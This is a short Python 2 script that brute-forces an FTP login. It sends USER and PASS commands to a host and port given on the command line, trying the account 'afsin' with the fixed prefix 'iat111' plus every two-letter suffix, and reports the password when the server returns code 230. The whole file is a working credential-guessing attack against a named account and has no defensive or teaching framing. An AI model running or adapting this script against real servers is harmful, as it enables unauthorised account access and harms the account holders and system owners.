#!/usr/bin/python

import os
import sys
import socket
import itertools

def connect(username, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((sys.argv[1], int(sys.argv[2])))
    data = s.recv(1024)

    s.send('user '     + username    + '\n')
    data = s.recv(1024)

    s.send('pass ' + password + '\n')
    data = s.recv(3)

    s.send('quit\n')
    s.close

    return data

username = 'afsin'
comb = itertools.product('abcdefghiklmnopqrstuwyz', repeat=2)

for x in comb:
    suffix=''.join(x)
    attempt = connect(username, 'iat111' + suffix)

    if attempt == '230':
        print('password found: ' + 'iat111' + suffix)
        sys.exit(0)
    else:
        sys.stdout.write(suffix+'\r')
        sys.stdout.flush()
